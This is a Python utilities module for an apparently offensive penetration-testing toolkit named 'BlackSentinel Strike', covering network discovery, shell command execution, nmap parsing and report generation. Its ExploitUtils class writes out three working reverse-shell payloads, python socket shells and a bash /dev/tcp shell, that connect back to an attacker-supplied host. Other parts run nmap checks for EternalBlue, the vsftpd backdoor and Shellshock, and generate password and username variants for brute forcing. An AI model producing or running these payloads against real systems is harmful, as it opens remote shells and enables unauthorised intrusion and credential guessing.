#!/usr/bin/env python3
"""
UTILITIES MODULE - BlackSentinel Strike
Shared utility classes for networking, system, files, exploits, reports, and parsing.
"""

import subprocess
import os
import platform
import socket
import shutil
import tempfile
from datetime import datetime
from pathlib import Path


class NetworkUtils:
    """Network utilities"""

    @staticmethod
    def get_local_ip():
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    @staticmethod
    def get_network_range():
        """Get network range"""
        ip = NetworkUtils.get_local_ip()
        parts = ip.split('.')
        return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"

    @staticmethod
    def check_host(host, timeout=1):
        """Check if a host is active"""
        try:
            system = platform.system()
            if system == "Windows":
                cmd = ["ping", "-n", "1", "-w", str(timeout * 1000), host]
            elif system == "Darwin":
                cmd = ["ping", "-c", "1", "-t", str(timeout), host]
            else:
                cmd = ["ping", "-c", "1", "-W", str(timeout), host]
            result = subprocess.run(
                cmd,
                capture_output=True,
                timeout=timeout + 1
            )
            return result.returncode == 0
        except Exception:
            return False

    @staticmethod
    def resolve_hostname(hostname):
        """Resolve hostname to IP"""
        try:
            return socket.gethostbyname(hostname)
        except Exception:
            return None

    @staticmethod
    def reverse_dns(ip):
        """Reverse DNS lookup"""
        try:
            return socket.gethostbyaddr(ip)[0]
        except Exception:
            return None


class SystemUtils:
    """System utilities"""

    @staticmethod
    def check_tool(tool_name):
        """Check if a tool is installed"""
        try:
            return shutil.which(tool_name) is not None
        except Exception:
            return False

    @staticmethod
    def get_tool_version(tool_name):
        """Get tool version"""
        try:
            result = subprocess.run(
                [tool_name, "--version"],
                capture_output=True,
                text=True,
                timeout=5
            )
            return result.stdout.strip().split('\n')[0]
        except Exception:
            return "Not available"

    @staticmethod
    def run_command(cmd, timeout=30):
        """Run system command"""
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            return {
                "success": result.returncode == 0,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            }
        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "stdout": "",
                "stderr": "Timeout",
                "returncode": -1
            }
        except Exception as e:
            return {
                "success": False,
                "stdout": "",
                "stderr": str(e),
                "returncode": -1
            }

    @staticmethod
    def get_system_info():
        """Get system information"""
        return {
            "system": platform.system(),
            "node": platform.node(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "python": platform.python_version()
        }


class FileUtils:
    """File utilities"""

    @staticmethod
    def ensure_dir(directory):
        """Ensure a directory exists"""
        Path(directory).mkdir(parents=True, exist_ok=True)

    @staticmethod
    def save_results(data, filename, directory=None):
        """Save results to file"""
        if directory is None:
            directory = os.path.join(tempfile.gettempdir(), "pentest_results")
        FileUtils.ensure_dir(directory)
        filepath = os.path.join(directory, filename)

        with open(filepath, "w") as f:
            if isinstance(data, dict):
                import json
                json.dump(data, f, indent=2)
            else:
                f.write(str(data))

        return filepath

    @staticmethod
    def load_wordlist(path):
        """Load wordlist from file"""
        try:
            with open(path, "r") as f:
                return [line.strip() for line in f.readlines() if line.strip()]
        except Exception:
            return []


class ExploitUtils:
    """Exploitation utilities"""

    @staticmethod
    def generate_payload(payload_type, lhost, lport):
        """Generate payload"""
        payloads = {
            "reverse_tcp": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "reverse_bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "reverse_python": f"python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
        }
        return payloads.get(payload_type, "Payload not found")

    @staticmethod
    def check_vulnerability(target, vuln_type):
        """Check vulnerability"""
        checks = {
            "eternalblue": f"nmap --script smb-vuln-ms17-010 -p 445 {target}",
            "vsftpd_backdoor": f"nmap --script ftp-vsftpd-backdoor -p 21 {target}",
            "shellshock": f"nmap --script http-shellshock -p 80 {target}",
        }

        cmd = checks.get(vuln_type)
        if cmd:
            result = SystemUtils.run_command(cmd, timeout=60)
            return result["success"] and "VULNERABLE" in result["stdout"]
        return False


class ReportUtils:
    """Report utilities"""

    @staticmethod
    def generate_markdown_report(data, title="Pentest Report"):
        """Generate Markdown report"""
        report = f"""# {title}

**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
**Author:** BlackSentinel Strike

---

## Executive Summary

{data.get('summary', 'Pending completion')}

## Findings

"""

        if "network" in data:
            report += f"""### Network Scan

{data['network']}

"""

        if "ports" in data:
            report += f"""### Port Scan

{data['ports']}

"""

        if "web" in data:
            report += f"""### Web Exploration

{data['web']}

"""

        if "exploits" in data:
            report += f"""### Exploitation

{data['exploits']}

"""

        report += """## Recommendations

1. Fix critical vulnerabilities immediately
2. Implement security patches
3. Review security configurations

---

*Generated by BlackSentinel Strike*
"""

        return report

    @staticmethod
    def save_report(content, filename, format="md"):
        """Save report to file"""
        directory = Path.home() / ".blacksentinel-strike" / "reports"
        FileUtils.ensure_dir(directory)

        filepath = os.path.join(directory, f"{filename}.{format}")
        with open(filepath, "w") as f:
            f.write(content)

        return filepath


class NmapParser:
    """Nmap output parser"""

    @staticmethod
    def parse_hosts(output):
        """Parse discovered hosts"""
        hosts = []
        lines = output.split('\n')

        for line in lines:
            if "Nmap scan report for" in line:
                parts = line.split()
                if len(parts) >= 5:
                    host = parts[4]
                    ip = parts[-1].strip('()')
                    hosts.append({"hostname": host, "ip": ip})

        return hosts

    @staticmethod
    def parse_ports(output):
        """Parse open ports"""
        ports = []
        lines = output.split('\n')

        for line in lines:
            if "/tcp" in line or "/udp" in line:
                parts = line.split()
                if len(parts) >= 3:
                    port_proto = parts[0].split('/')
                    port = port_proto[0]
                    proto = port_proto[1] if len(port_proto) > 1 else "tcp"
                    state = parts[1]
                    service = parts[2] if len(parts) > 2 else "unknown"

                    ports.append({
                        "port": port,
                        "protocol": proto,
                        "state": state,
                        "service": service
                    })

        return ports

    @staticmethod
    def parse_vulnerabilities(output):
        """Parse discovered vulnerabilities"""
        vulns = []
        lines = output.split('\n')

        for line in lines:
            if "VULNERABLE" in line:
                vulns.append(line.strip())

        return vulns


class BruteForceUtils:
    """Brute force utilities"""

    @staticmethod
    def generate_password_variants(base_word):
        """Generate password variations"""
        variants = [
            base_word,
            base_word.lower(),
            base_word.upper(),
            base_word.capitalize(),
            base_word + "123",
            base_word + "!",
            base_word + "@",
            "123" + base_word,
            base_word + "2024",
            base_word + "2025",
            base_word + "2026",
        ]
        return variants

    @staticmethod
    def generate_username_variants(name):
        """Generate username variations"""
        variants = [
            name,
            name.lower(),
            name.upper(),
            name.capitalize(),
            name + "1",
            name + "123",
            "admin_" + name,
            name + "_admin",
        ]
        return variants
